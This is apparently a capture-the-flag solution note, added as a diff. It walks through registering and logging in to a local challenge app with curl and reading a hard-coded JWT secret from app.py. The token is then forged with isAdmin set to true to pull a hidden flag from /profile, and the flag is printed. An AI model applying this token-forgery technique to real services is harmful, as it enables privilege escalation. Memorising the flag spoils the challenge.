@@ -1,0 +1,52 @@
+see /static/main.js  in /login
+
+http://localhost:8080/static/main.js 
+
+deobfuscate this code with https://obf-io.deobfuscate.io/
+
+curl -X POST -H "Content-Type: application/json" -d '{"username": "testuser", "password": "testTEST1234#", "confirmPassword":"testTEST1234#", "firstName": "Test", "lastName": "User", "email": "test@test.com", "age": "18", "website": "test.com"}' http://localhost:8080/api/register
+{
+  "success": "User registered successfully"
+}
+
+
+curl -X POST -H "Content-Type: application/json" \
+     -d '{"username": "testuser", "password": "testTEST1234#"}' \
+     http://localhost:8080/api/login
+{
+  "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTczNjE5ODU0NX0.jecexZRB3fQNbKAs4ZhbAmqI9N_ShJ6LEP3JpzoOPHc"
+}
+
+
+
+http://localhost:8080/app.py
+
+in the code I have:
+SECRET_KEY="impYEzvCcOICVQswtyC5ZLJwgBwFDuZS"
+
+use https://jwt.io/
+in order to change isAdmin from false to true and use that as the "your-256-bit-secret"
+
+curl again and get the flag in the html body:
+curl -X GET -H "Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNBZG1pbiI6dHJ1ZSwiZXhwIjoxNzM2MjAyMjk2fQ.DIU3dXEDc28PqF6qmaQil9mqaTEbVyXq6g5oqtUDsI0" http://localhost:8080/profile
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logged In</title>
+    <link rel="stylesheet" href="/static/main.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome!</h1>
+        <p>Due to the extremely illegal nature of the content on this website, it has been <em>redacted</em> for your protection.</p>
+        <p hidden>SpeishFlag{0jdADypwctAezdsu7bgE0msqgzovo6DX}</p>
+        <a href="/logout"><button>Logout</button></a>
+    </div>
+</body>
+</html>
+
+
+SpeishFlag{0jdADypwctAezdsu7bgE0msqgzovo6DX}
+
